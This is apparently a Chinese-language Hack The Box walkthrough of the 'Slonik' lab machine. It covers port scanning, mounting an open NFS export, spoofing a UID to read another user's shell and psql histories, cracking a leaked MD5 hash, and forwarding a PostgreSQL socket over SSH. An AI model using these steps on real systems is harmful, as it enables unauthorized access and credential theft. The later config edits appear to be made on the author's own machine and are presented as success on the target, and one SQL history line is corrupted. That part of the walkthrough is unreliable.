## Slonik
### 总结
```
[★]$ mkdir /tmp/nfs
[★]$ sudo mount -t nfs 10.129.234.160:/home /tmp/nfs
[★]$ ls -la /tmp/nfs
total 20
drwxr-xr-x  3 root root  4096 Oct 24  2023 .
drwxrwxrwt 20 root root 12288 Mar  9 07:12 ..
drwxr-x---  5 1337 1337  4096 Sep 22 07:46 service
[★]$ cd /tmp/nfs
[★]$ sudo useradd service -u 1337
[★]$ sudo su service
sh: 1: [[: not found
\[\033[1;32m\]\342\224\214\342\224\200[\[\033[1;37m\]\u\[\033[01;32m\]@\[\033[01;34m\]\h\[\033[1;32m\]]\342\224\200[\[\033[1;37m\]\w\[\033[1;32m\]]\n\[\033[1;32m\]\342\224\224\342\224\200\342\224\200\342\225\274 [\[\e[01;33m\]★\[\e[01;32m\]]$ \[\e[0m\]\[\033[1;32m\]bash
service@htb-xybs8a7uq9:/tmp/nfs$ ls -la 
total 20
drwxr-xr-x  3 root    root     4096 Oct 24  2023 .
drwxrwxrwt 20 root    root    12288 Mar  9 07:12 ..
drwxr-x---  5 service service  4096 Sep 22 07:46 service
service@htb-xybs8a7uq9:/tmp/nfs$ ls -la service/
total 40
drwxr-x--- 5 service service 4096 Sep 22 07:46 .
drwxr-xr-x 3 root    root    4096 Oct 24  2023 ..
-rw-r--r-- 1 service service   90 Sep 22 07:46 .bash_history
-rw-r--r-- 1 service service  220 Oct 24  2023 .bash_logout
-rw-r--r-- 1 service service 3771 Oct 24  2023 .bashrc
drwx------ 2 service service 4096 Oct 24  2023 .cache
drwxrwxr-x 3 service service 4096 Oct 24  2023 .local
-rw-r--r-- 1 service service  807 Oct 24  2023 .profile
-rw-r--r-- 1 service service  326 Sep 22 07:46 .psql_history
drwxrwxr-x 2 service service 4096 Oct 24  2023 .ssh
service@htb-xybs8a7uq9:/tmp/nfs$ cat service/.bash_history
ls -lah /var/run/postgresql/
file /var/run/postgresql/.s.PGSQL.5432
psql -U postgres
exit
service@htb-xybs8a7uq9:/tmp/nfs$ find / -name postgresql.conf 2>/dev/null
/etc/postgresql/15/main/postgresql.conf
service@htb-xybs8a7uq9:/tmp/nfs$ cd ../../etc/postgresql/15/main/
service@htb-xybs8a7uq9:/etc/postgresql/15/main$ ls -la
total 68
drwxr-xr-x 3 postgres postgres  4096 Oct  7  2024 .
drwxr-xr-x 3 postgres postgres  4096 Oct  7  2024 ..
drwxr-xr-x 2 postgres postgres  4096 Oct  7  2024 conf.d
-rw-r--r-- 1 postgres postgres   315 Oct  7  2024 environment
-rw-r--r-- 1 postgres postgres   143 Oct  7  2024 pg_ctl.conf
-rw-r----- 1 postgres postgres  5002 Oct  7  2024 pg_hba.conf
-rw-r----- 1 postgres postgres  1636 Oct  7  2024 pg_ident.conf
-rw-r--r-- 1 postgres postgres 29709 Oct  7  2024 postgresql.conf
-rw-r--r-- 1 postgres postgres   317 Oct  7  2024 start.conf
service@htb-xybs8a7uq9:/etc/postgresql/15/main$ sudo vi postgresql.conf
service@htb-xybs8a7uq9:/etc/postgresql/15/main$ sudo vi pg_hba.conf
service@htb-xybs8a7uq9:/etc/postgresql/15/main$ sudo systemctl restart postgresql
service@htb-xybs8a7uq9:/etc/postgresql/15/main$ systemctl status postgresql
● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; preset: disabled)
     Active: active (exited) since Mon 2026-03-09 07:25:43 CDT; 19s ago
    Process: 27073 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 27073 (code=exited, status=0/SUCCESS)
        CPU: 1ms
service@htb-xybs8a7uq9:/etc/postgresql/15/main$ 
```
```
[★]$ nmap -sV -sC 10.129.234.160
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-09 01:19 CDT
Nmap scan report for 10.129.234.160
Host is up (0.0098s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2d:8d:0a:43:a7:58:20:73:6b:8c:fc:b0:d1:2f:45:07 (ECDSA)
|_  256 82:fb:90:b0:eb:ac:20:a2:53:5e:3c:7c:d3:3c:34:79 (ED25519)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      39772/udp6  mountd
|   100005  1,2,3      40219/udp   mountd
|   100005  1,2,3      53885/tcp6  mountd
|   100005  1,2,3      56033/tcp   mountd
|   100021  1,3,4      33115/udp6  nlockmgr
|   100021  1,3,4      38467/udp   nlockmgr
|   100021  1,3,4      42609/tcp6  nlockmgr
|_  100021  1,3,4      44369/tcp   nlockmgr
2049/tcp open  nfs     3-4 (RPC #100003)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.05 seconds

[★]$ sudo nmap -p- -vvv --min-rate 10000 10.129.234.160
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-09 01:20 CDT
Initiating Ping Scan at 01:20
Scanning 10.129.234.160 [4 ports]
Completed Ping Scan at 01:20, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:20
Completed Parallel DNS resolution of 1 host. at 01:20, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 01:20
Scanning 10.129.234.160 [65535 ports]
Discovered open port 111/tcp on 10.129.234.160
Discovered open port 22/tcp on 10.129.234.160
Discovered open port 44369/tcp on 10.129.234.160
Discovered open port 57913/tcp on 10.129.234.160
Discovered open port 2049/tcp on 10.129.234.160
Discovered open port 56033/tcp on 10.129.234.160
Discovered open port 48909/tcp on 10.129.234.160
Discovered open port 39545/tcp on 10.129.234.160
Completed SYN Stealth Scan at 01:21, 5.59s elapsed (65535 total ports)
Nmap scan report for 10.129.234.160
Host is up, received echo-reply ttl 63 (0.0087s latency).
Scanned at 2026-03-09 01:20:55 CDT for 5s
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
111/tcp   open  rpcbind syn-ack ttl 63
2049/tcp  open  nfs     syn-ack ttl 63
39545/tcp open  unknown syn-ack ttl 63
44369/tcp open  unknown syn-ack ttl 63
48909/tcp open  unknown syn-ack ttl 63
56033/tcp open  unknown syn-ack ttl 63
57913/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 5.74 seconds
           Raw packets sent: 65587 (2.886MB) | Rcvd: 65542 (2.622MB)

[★]$ nmap -p 22,111,2049,39545,44369,48909,56033,57913 -sCV 10.129.234.160
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-09 01:22 CDT
Nmap scan report for 10.129.234.160
Host is up (0.0089s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2d:8d:0a:43:a7:58:20:73:6b:8c:fc:b0:d1:2f:45:07 (ECDSA)
|_  256 82:fb:90:b0:eb:ac:20:a2:53:5e:3c:7c:d3:3c:34:79 (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      39772/udp6  mountd
|   100005  1,2,3      40219/udp   mountd
|   100005  1,2,3      53885/tcp6  mountd
|   100005  1,2,3      56033/tcp   mountd
|   100021  1,3,4      33115/udp6  nlockmgr
|   100021  1,3,4      38467/udp   nlockmgr
|   100021  1,3,4      42609/tcp6  nlockmgr
|   100021  1,3,4      44369/tcp   nlockmgr
|   100024  1          34449/tcp6  status
|   100024  1          43818/udp   status
|   100024  1          57913/tcp   status
|   100024  1          58236/udp6  status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
39545/tcp open  mountd   1-3 (RPC #100005)
44369/tcp open  nlockmgr 1-4 (RPC #100021)
48909/tcp open  mountd   1-3 (RPC #100005)
56033/tcp open  mountd   1-3 (RPC #100005)
57913/tcp open  status   1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
#### 所有端口的 TTL 值均显示为 63，这与一跳之外的 Linux 系统的预期 TTL 值相符
#### showmount -e将列出NFS上可用的挂载点（份额）：
```
[★]$ showmount -e 10.129.234.160
Export list for 10.129.234.160:
/var/backups *
/home        *

[★]$ mkdir /tmp/nfs
[★]$ sudo mount -t nfs 10.129.234.160:/home /tmp/nfs
[★]$ ls -la /tmp/nfs
total 20
drwxr-xr-x  3 root root  4096 Oct 24  2023 .
drwxrwxrwt 21 root root 12288 Mar  9 01:29 ..
drwxr-x---  5 1337 1337  4096 Sep 22 07:46 service

[★]$ cd /tmp/nfs
[★]$ sudo useradd service -u 1337
[★]$ sudo su service
sh: 1: [[: not found
\[\033[1;32m\]\342\224\214\342\224\200[\[\033[1;37m\]\u\[\033[01;32m\]@\[\033[01;34m\]\h\[\033[1;32m\]]\342\224\200[\[\033[1;37m\]\w\[\033[1;32m\]]\n\[\033[1;32m\]\342\224\224\342\224\200\342\224\200\342\225\274 [\[\e[01;33m\]★\[\e[01;32m\]]$ \[\e[0m\]\[\033[1;32m\]
sh: 1: [[: not found
\[\033[1;32m\]\342\224\214\342\224\200[\[\033[1;37m\]\u\[\033[01;32m\]@\[\033[01;34m\]\h\[\033[1;32m\]]\342\224\200[\[\033[1;37m\]\w\[\033[1;32m\]]\n\[\033[1;32m\]\342\224\224\342\224\200\342\224\200\342\225\274 [\[\e[01;33m\]★\[\e[01;32m\]]$ \[\e[0m\]\[\033[1;32m\]bash
service@htb-pa4lnyma7f:/home/syareya55$ ls -la /tmp/nfs/service
total 40
drwxr-x--- 5 service service 4096 Sep 22 07:46 .
drwxr-xr-x 3 root    root    4096 Oct 24  2023 ..
-rw-r--r-- 1 service service   90 Sep 22 07:46 .bash_history
-rw-r--r-- 1 service service  220 Oct 24  2023 .bash_logout
-rw-r--r-- 1 service service 3771 Oct 24  2023 .bashrc
drwx------ 2 service service 4096 Oct 24  2023 .cache
drwxrwxr-x 3 service service 4096 Oct 24  2023 .local
-rw-r--r-- 1 service service  807 Oct 24  2023 .profile
-rw-r--r-- 1 service service  326 Sep 22 07:46 .psql_history
drwxrwxr-x 2 service service 4096 Oct 24  2023 .ssh
service@htb-pa4lnyma7f:/home/syareya55$
service@htb-pa4lnyma7f:/home/syareya55$ ls -la /tmp/nfs/service/.ssh
total 16
drwxrwxr-x 2 service service 4096 Oct 24  2023 .
drwxr-x--- 5 service service 4096 Sep 22 07:46 ..
-rw------- 1 service service   96 Oct 24  2023 authorized_keys
-rw-r--r-- 1 service service   96 Oct 24  2023 id_ed25519.pub

service@htb-pa4lnyma7f:/home/syareya55$ cat /tmp/nfs/service/.psql_history
CREATE DATABASE service;
\c service;
CREATE TABLE users ( id SERIAL PRIMARY KEY, username VARCHAR(255) NOT NULL, password VARCHAR(255) NOT NULL, description TEXT);
INSERT INTO users (username, password, description)VALUES ('service', 'aaabf0d39951f3e6c3e8a7911df524c2'WHERE', network access account');
select * from users;
\q
service@htb-pa4lnyma7f:/home$ cat /tmp/nfs/service/.bash_history
ls -lah /var/run/postgresql/
file /var/run/postgresql/.s.PGSQL.5432
psql -U postgres                       //数据库是 PostgreSQL,没有写密码
exit
```
#### 得到密码hash
https://crackstation.net/
```
aaabf0d39951f3e6c3e8a7911df524c2	md5  service
```
#### 登录凭证
```
[★]$ netexec ssh 10.129.234.160 -u service -p service
SSH         10.129.234.160  22     10.129.234.160   [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
SSH         10.129.234.160  22     10.129.234.160   [+] service:service  Network Devices
```
#### 要访问 PostgreSQL 数据库正在监听的 UNIX 套接字（它被当作一个文件来处理），如.bash_history文件中所示。SSH 实际上可以进行端口转发，将数据转发-L到 UNIX 套接字：
```
[★]$ netexec ssh 10.129.234.160 -u service -p service
SSH         10.129.234.160  22     10.129.234.160   [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
SSH         10.129.234.160  22     10.129.234.160   [+] service:service  Network Devices

[★]$ sshpass -p service ssh -N -L 5432:/var/run/postgresql/.s.PGSQL.5432 service@10.129.234.160  //转接

[★]$ psql -h 127.0.0.1 -p 5432 -U postgres  //登录不上
psql: error: connection to server at "127.0.0.1", port 5432 failed: Connection refused
	Is the server running on that host and accepting TCP/IP connections?

[★]$ psql -h localhost -p 5432 -U postgres  ////登录不上
psql: error: connection to server at "localhost" (::1), port 5432 failed: Connection refused
	Is the server running on that host and accepting TCP/IP connections?
connection to server at "localhost" (127.0.0.1), port 5432 failed: Connection refused
	Is the server running on that host and accepting TCP/IP connections?
connection to server at "localhost" (127.0.0.1), port 5432 failed: Connection refused
	Is the server running on that host and accepting TCP/IP connections?
```
#### 查看配置
```
service@htb-pa4lnyma7f:/home/syareya55$ find / -name postgresql.conf 2>/dev/null
/etc/postgresql/15/main/postgresql.conf
service@htb-pa4lnyma7f:/home/syareya55$ cat /etc/postgresql/15/main/postgresql.conf
# - Connection Settings -

#listen_addresses = 'localhost'		# what IP address(es) to listen on;
					# comma-separated list of addresses;
					# defaults to 'localhost'; use '*' for all
					# (change requires restart)
port = 5432				# (change requires restart)
max_connections = 100			# (change requires restart)
#superuser_reserved_connections = 3	# (change requires restart)
unix_socket_directories = '/var/run/postgresql'	# comma-separated list of directories
					# (change requires restart)
#unix_socket_group = ''			# (change requires restart)
#unix_socket_permissions = 0777		# begin with 0 to use octal notation
					# (change requires restart)
#bonjour = off				# advertise server via Bonjour
					# (change requires restart)
#bonjour_name = ''			# defaults to the computer name
					# (change requires restart)
```
#### 会去掉注释
```
ervice@htb-pa4lnyma7f:/home/syareya55$ ls -la /etc/postgresql/15/main/postgresql.conf
-rw-r--r-- 1 postgres postgres 29709 Oct  7  2024 /etc/postgresql/15/main/postgresql.conf
service@htb-pa4lnyma7f:/home/syareya55$ sudo vi /etc/postgresql/15/main/postgresql.conf
```
#### 查看系统
```
service@htb-pa4lnyma7f:/home$ systemctl status postgresql
○ postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; preset: disabled)
     Active: inactive (dead)

service@htb-pa4lnyma7f:/home/syareya55$ sudo systemctl start postgresql
service@htb-pa4lnyma7f:/home/syareya55$ systemctl status postgresql
● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; preset: disabled)
     Active: active (exited) since Mon 2026-03-09 03:22:18 CDT; 8s ago
    Process: 196506 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 196506 (code=exited, status=0/SUCCESS)
        CPU: 2ms
```
#### 连接需要密码
```
[★]$ sshpass -p service ssh -N -L 5432:/var/run/postgresql/.s.PGSQL.5432 service@10.129.234.160
[★]$ psql -h 127.0.0.1 -p 5432 -U postgres
Password for user postgres: 
psql: error: connection to server at "127.0.0.1", port 5432 failed: fe_sendauth: no password supplied
```
#### 修改另一个文件
```
service@htb-pa4lnyma7f:/home/syareya55$ ls -la /etc/postgresql/15/main/
total 68
drwxr-xr-x 3 postgres postgres  4096 Mar  9 03:18 .
drwxr-xr-x 3 postgres postgres  4096 Oct  7  2024 ..
drwxr-xr-x 2 postgres postgres  4096 Oct  7  2024 conf.d
-rw-r--r-- 1 postgres postgres   315 Oct  7  2024 environment
-rw-r--r-- 1 postgres postgres   143 Oct  7  2024 pg_ctl.conf
-rw-r----- 1 postgres postgres  5002 Oct  7  2024 pg_hba.conf
-rw-r----- 1 postgres postgres  1636 Oct  7  2024 pg_ident.conf
-rw-r--r-- 1 postgres postgres 29705 Mar  9 03:18 postgresql.conf
-rw-r--r-- 1 postgres postgres   317 Oct  7  2024 start.conf
# replication privilege.
service@htb-pa4lnyma7f:/home/syareya55$ sudo cat /etc/postgresql/15/main/pg_hba.conf
<SNIP>
# "local" is for Unix domain socket connections only
local   all             all                                     peer
# IPv4 local connections:
host    all             all             127.0.0.1/32            scram-sha-256
# IPv6 local connections:
</SNIP>
service@htb-pa4lnyma7f:/home/syareya55$ sudo vi /etc/postgresql/15/main/pg_hba.conf
<SNIP>
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
</SNIP>

service@htb-pa4lnyma7f:/home/syareya55$ sudo systemctl restart postgresql
service@htb-pa4lnyma7f:/home/syareya55$ systemctl status postgresql
● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; preset: disabled)
     Active: active (exited) since Mon 2026-03-09 03:34:04 CDT; 17s ago
    Process: 214975 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 214975 (code=exited, status=0/SUCCESS)
        CPU: 1ms

service@htb-pa4lnyma7f:/home/syareya55$ pg_lsclusters
Ver Cluster Port Status Owner    Data directory              Log file
15  main    5432 online postgres /var/lib/postgresql/15/main /var/log/postgresql/postgresql-15-main.log

```
#### 成功了
```
[★]$ sshpass -p service ssh -N -L 5432:/var/run/postgresql/.s.PGSQL.5432 service@10.129.234.160

[★]$ psql -h 127.0.0.1 -p 5432 -U postgres
psql (15.14 (Debian 15.14-0+deb12u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
Type "help" for help.

postgres=#
postgres=# \l List of databases
 Name | Owner | Encoding | Collate | Ctype | ICU Locale | Locale Provider | Access privileges 
 -----------+----------+----------+-------------+-------------+------------+-----------------+-----------------------
 postgres | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | | libc | 
 template0 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | | libc | =c/postgres +
 | | | | | | | postgres=CTc/postgres
 template1 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | | libc | =c/postgres +
 | | | | | | | postgres=CTc/postgres
 (3 rows)
```
#### 可惜没有看到service
#### 先创建了service用户
```
[★]$ psql -h 127.0.0.1 -p 5432 -U postgres
psql (15.14 (Debian 15.14-0+deb12u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
Type "help" for help.

postgres=# \du
                                   List of roles
 Role name |                         Attributes                         | Member of 
-----------+------------------------------------------------------------+-----------
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS | {}

postgres=# \l
postgres=# 
postgres=# \c service
connection to server at "127.0.0.1", port 5432 failed: FATAL:  database "service" does not exist
Previous connection kept
postgres=# CREATE DATABASE service OWNER service;
ERROR:  role "service" does not exist
postgres=# CREATE ROLE service WITH LOGIN PASSWORD 'service';
CREATE ROLE
postgres=# \du
                                   List of roles
 Role name |                         Attributes                         | Member of 
-----------+------------------------------------------------------------+-----------
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS | {}
 service   |                                                            | {}

postgres=#
```
#### 再创建service数据库
```
postgres=# CREATE DATABASE service OWNER service;
CREATE DATABASE
postgres=# \c service
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
You are now connected to database "service" as user "postgres".
```
#### 看到了SSL没有关闭，修改文件
```
service@htb-xybs8a7uq9:/tmp/nfs$ sudo vi /etc/postgresql/15/main/postgresql.conf
ssl = on
改成：
ssl = off
service@htb-xybs8a7uq9:/tmp/nfs$ sudo systemctl restart postgresql

ervice@htb-xybs8a7uq9:/tmp/nfs$ sshpass -p service ssh -N -L 5432:/var/run/postgresql/.s.PGSQL.5432 service@10.129.234.160

```
